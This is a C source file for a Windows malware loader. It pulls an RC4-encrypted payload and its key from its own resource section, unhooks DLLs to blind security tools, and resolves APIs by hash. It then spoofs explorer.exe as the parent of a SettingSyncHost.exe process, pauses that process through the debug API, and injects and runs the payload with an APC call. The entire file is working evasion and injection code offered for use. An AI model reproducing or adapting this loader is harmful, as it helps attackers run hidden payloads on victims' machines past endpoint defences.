#include <Windows.h>
#include "Structs.h"
#include "Types.h"
#include "Header.h"
#include "Debug.h"
#include "Resource.h"

#pragma comment(linker,"/ENTRY:main")


#define TARGET_PROCESS		L"\\??\\C:\\Windows\\System32\\SettingSyncHost.exe"
#define PROCESS_PARMS		L"\"C:\\Windows\\System32\\SettingSyncHost.exe\" -Embedding"
#define PROCESS_PATH		L"C:\\Windows\\System32"
#define PARENT_PROC			L"explorer.exe"


// needed to compile
extern void* __cdecl memset(void*, int, size_t);
#pragma intrinsic(memset)
#pragma function(memset)
void* __cdecl memset(void* pTarget, int value, size_t cbTarget) {
	unsigned char* p = (unsigned char*)pTarget;
	while (cbTarget-- > 0) {
		*p++ = (unsigned char)value;
	}
	return pTarget;
}


/*
	function to get data from the .rsrc section, replacing FindResource & LoadResource & LockResource & SizeofResource
	from : https://github.com/ORCx41/ManualRsrcDataFetching
*/
BOOL GetResourceData(HMODULE hModule, WORD ResourceId, PVOID* ppResourceRawData, PDWORD psResourceDataSize) {

	CHAR* pBaseAddr = (CHAR*)hModule;
	PIMAGE_DOS_HEADER 	pImgDosHdr = (PIMAGE_DOS_HEADER)pBaseAddr;
	PIMAGE_NT_HEADERS 	pImgNTHdr = (PIMAGE_NT_HEADERS)(pBaseAddr + pImgDosHdr->e_lfanew);
	PIMAGE_OPTIONAL_HEADER 	pImgOptionalHdr = (PIMAGE_OPTIONAL_HEADER)&pImgNTHdr->OptionalHeader;
	PIMAGE_DATA_DIRECTORY 	pDataDir = (PIMAGE_DATA_DIRECTORY)&pImgOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];

	PIMAGE_RESOURCE_DIRECTORY 	pResourceDir = NULL, pResourceDir2 = NULL, pResourceDir3 = NULL;
	PIMAGE_RESOURCE_DIRECTORY_ENTRY pResourceEntry = NULL, pResourceEntry2 = NULL, pResourceEntry3 = NULL;

	PIMAGE_RESOURCE_DATA_ENTRY 	pResource = NULL;


	pResourceDir = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress);
	pResourceEntry = (IMAGE_RESOURCE_DIRECTORY_ENTRY*)(pResourceDir + 1);


	for (size_t i = 0; i < (pResourceDir->NumberOfNamedEntries + pResourceDir->NumberOfIdEntries); i++) {

		if (pResourceEntry[i].DataIsDirectory == 0)
			break;

		pResourceDir2 = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry[i].OffsetToDirectory & 0x7FFFFFFF));
		pResourceEntry2 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir2 + 1);

		if (pResourceEntry2->DataIsDirectory == 1 && pResourceEntry2->Id == ResourceId) {

			pResourceDir3 = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry2->OffsetToDirectory & 0x7FFFFFFF));
			pResourceEntry3 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir3 + 1);

			pResource = (PIMAGE_RESOURCE_DATA_ENTRY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry3->OffsetToData & 0x7FFFFFFF));

			*ppResourceRawData = (PVOID)(pBaseAddr + (pResource->OffsetToData));
			*psResourceDataSize = pResource->Size;

			break;
		}

	}

	if (*ppResourceRawData != NULL && *psResourceDataSize != NULL)
		return TRUE;

	return FALSE;
}




/*
	program's entry point
*/

int main() {

	DWORD		ProcId				= NULL;
	HANDLE		hParentProcess		= NULL,
				hProcess			= NULL,
				hThread				= NULL;
	
	DWORD		psResourceDataSize	= NULL;

	PVOID		ppResourceRawData	= NULL,
				pAddress			= NULL;

	NTSTATUS	STATUS				= NULL;

	BYTE		Rc4Key[KEY_SIZE]	= { 0 };
	
	// getting a pointer to our data in .rsrc section
	if (!GetResourceData(GetModuleHandle(NULL), TERRA_PAYLOAD, &ppResourceRawData, &psResourceDataSize)) {
#ifdef DEBUG
		PRINTA("[!] GetResourceData Failed (main.c:105) \n");
#endif // DEBUG
		goto _finish;
	}

	// printing info 
#ifdef DEBUG
	PRINTA("[+] Data : 0x%p Of Size : %ld \n", ppResourceRawData, psResourceDataSize);
#endif // DEBUG

	// getting the rc4 key from the .rsrc section [first 16 byte] 
	_memcpy(Rc4Key, ppResourceRawData, KEY_SIZE);								// copying the key
	ppResourceRawData = (PVOID)((ULONG_PTR)ppResourceRawData + KEY_SIZE);		// updating payload base address [skipping the key's bytes]

	// printing info
#ifdef DEBUG
	PRINTA("[i] Rc4 Key : [ ");
	for (int i = 0; i < KEY_SIZE; i++)
		PRINTA("%02X ", Rc4Key[i]);
	PRINTA("]\n");
#endif // DEBUG


	// unhooking 
	if (!RefreshAllDlls()) {
#ifdef DEBUG
		PRINTA("[!] RefreshAllDlls Failed (main.c:131) \n");
#endif // DEBUG
		goto _finish;
	}

	// getting explorer.exe process id
	if (!GetParentProcessid(PARENT_PROC, &ProcId) || !ProcId) {
#ifdef DEBUG
		PRINTW(L"[!] Failed To Get %s's Process Id (main.c:139)\n", PARENT_PROC);
#endif // DEBUG
		goto _finish;
	}

	// getting the addresses of needed functions using api hashing [these should be all clean - not hooked]
	fnOpenProcess				pOpenProcess			= (fnOpenProcess)GetProcAddressH(GetModuleHandleH(KERNEL32DLL), OpenProcess_StrHashed);
	fnGetProcessId				pGetProcessId			= (fnGetProcessId)GetProcAddressH(GetModuleHandleH(KERNEL32DLL), GetProcessId_StrHashed);
	fnDebugActiveProcess		pDebugActiveProcess		= (fnDebugActiveProcess)GetProcAddressH(GetModuleHandleH(KERNEL32DLL), DebugActiveProcess_StrHashed);
	fnDebugActiveProcessStop	pDebugActiveProcessStop = (fnDebugActiveProcessStop)GetProcAddressH(GetModuleHandleH(KERNEL32DLL), DebugActiveProcessStop_StrHashed);
	fnNtQueueApcThread			NtQueueApcThread		= (fnNtQueueApcThread)GetProcAddressH(GetModuleHandleH(NTDLLDLL), NtQueueApcThread_StrHashed);

	// small check
	if (pOpenProcess == NULL || pGetProcessId == NULL || pDebugActiveProcess == NULL || pDebugActiveProcessStop == NULL || NtQueueApcThread == NULL)
		goto _finish;


	// openning a handle to explorer.exe process
	hParentProcess = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcId);
	if (!hParentProcess) {
#ifdef DEBUG
		PRINTA("[!] Failed To Get %s's Process Handle (main.c:159)\n", TARGET_PROCESS);
#endif // DEBUG
		goto _finish;
	}


	// creating child process (ppid spoofing && signatures restricted policy)
	if (!NtCreateProcess(TARGET_PROCESS, PROCESS_PARMS, PROCESS_PATH, hParentProcess, &hProcess, &hThread)) {
#ifdef DEBUG
		PRINTW(L"[!] Counld Not Create Target Process : %s (main.169)\n", TARGET_PROCESS);
#endif // DEBUG
		goto _finish;
	}


	WaitForInputIdle(hProcess, INFINITE);		// if u want to wait some time to let the process load all modules ...

	// prinitg info
#ifdef DEBUG
	PRINTW(L"[+] \"%s\" : Parent Process Id : %ld \n", PARENT_PROC, pGetProcessId(hParentProcess));
	PRINTA("[+] \"SettingSyncHost.exe\" Target Process Id : %ld \n", pGetProcessId(hProcess));
#endif // DEBUG


	// pausing the process
	if (!pDebugActiveProcess(pGetProcessId(hProcess))) {
#ifdef DEBUG
		PRINTA("[!] DebugActiveProcess Failed : %d (main.c:187) \n", GetLastError());
#endif // DEBUG
		goto _finish;
	}

	// injecting the payload
	if (!InjectPayload2(hProcess, ppResourceRawData, (SIZE_T)psResourceDataSize, &pAddress, Rc4Key, sizeof(Rc4Key))) {
#ifdef DEBUG
		PRINTA("[!] InjectPayload/2 Failed (main.c:195)\n");
#endif // DEBUG
		goto _finish;
	}

	// prinitg info
#ifdef DEBUG
	PRINTA("[+] Address Of Payload In Target Process : 0x%p \n", pAddress);
#endif // DEBUG


	// setting our payload for execution (no need for suspend / resume cz process is being debugged - paused alrdy)
	if (!NT_SUCCESS(STATUS = (NtQueueApcThread(hThread, pAddress, NULL, NULL, NULL)))) {
#ifdef DEBUG
		PRINTA("[!] NtQueueApcThread Failed With Error : 0x%0.8X (main.c:209)\n", STATUS);
#endif
		goto _finish;
	}

	// resuming the process
	if (!pDebugActiveProcessStop(pGetProcessId(hProcess))) {
#ifdef DEBUG
		PRINTA("[!] DebugActiveProcessStop Failed : %d (main.c:217) \n", GetLastError());
#endif // DEBUG
		goto _finish;
	}
	
	

_finish:
	if(hParentProcess)
		CloseHandle(hParentProcess);
	if(hProcess)
		CloseHandle(hProcess);
	if(hThread)
		CloseHandle(hThread);
	return 0;
	
}




